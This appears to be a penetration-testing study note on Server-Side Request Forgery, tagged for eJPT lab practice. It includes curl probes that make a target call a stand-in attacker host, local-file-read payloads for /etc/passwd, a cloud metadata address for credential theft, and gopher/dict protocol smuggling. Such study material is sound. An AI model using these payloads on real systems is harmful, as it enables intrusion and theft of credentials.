---
type: technique
tags: [ejpt:web-pentest]
tools: [curl]
cves: []
related: ["[[local-file-inclusion]]", "[[pivoting]]", "[[information-gathering]]"]
---

# Server-Side Request Forgery (SSRF)

The *server* makes a network request on your behalf — to a host, port, or URL you choose. You never touch the target directly; you borrow the server's routing position and its view of the network.

## Why it matters

The server usually sits somewhere you don't: inside the internal range, next to other boxes, with access to `127.0.0.1` and cloud metadata. Forging its request turns *"I can't reach that"* into *"the server fetched it for me"*.

## Detect it

Any input that becomes a request rather than data:

- `url=`, `uri=`, `path=`, `fetch=`, `webhook=`, `image=`, `dest=`, `callback=`
- Fetch/proxy/"preview this page" features, PDF/image generators, webhook testers.

Probe with a URL you control *and* a URL only the server can reach:

```sh
curl -X POST http://TARGET/process.php --data "url=http://ATTACKER/"      # did it call home?
curl -X POST http://TARGET/process.php --data "url=http://127.0.0.1/"     # loopback from the server's view
curl -X POST http://TARGET/process.php --data "url=http://INTERNAL/"      # a host you have no route to
```

The tell: **the response body contains the fetched content.** You sent a URL; you got someone else's page back.

## The one-parameter trick (SSRF + LFI)

A PHP `file_get_contents($input)` style sink does *both*, decided by the input itself:

| You send | What happens |
|----------|--------------|
| `url=info` | local file read (relative path) — [[local-file-inclusion]] |
| `url=../../../etc/passwd` | local file read (traversal) — [[local-file-inclusion]] |
| `url=http://20.20.20.3` | server-side HTTP request to an internal host — **SSRF** |
| `url=file:///etc/passwd` | local file read via wrapper — [[local-file-inclusion]] |

So a *single* parameter can be an LFI and an SSRF at once. Test the scheme, not just the path: try bare words, `../` traversal, `file://`, and `http://` before you classify the bug.

## Use it as recon

Fetch the internal host's page **before** you have a route to it — you learn the app, the form fields, and the endpoints while the box is still unreachable. That page is then the reference for what you'll see once you pivot and `portfwd` the real port ([[pivoting]], [[port-forwarding]]).

## Escalate it

- **Loopback / internal services** — `http://127.0.0.1:6379`, admin panels bound to `127.0.0.1` only.
- **Cloud metadata** — `http://169.254.169.254/latest/meta-data/` (AWS/GCP/Azure credential theft).
- **Port scan by response** — timing/length differences reveal what the server can reach.
- **Protocol smuggling** — `gopher://`, `dict://` to speak raw TCP (Redis, SMTP) when HTTP is all you have.

## Seen in

[[dark]] (`process.php` `url=` → `http://20.20.20.3` echoed the internal host's page, while the same field also read `../../../etc/passwd` — the two-in-one parameter)
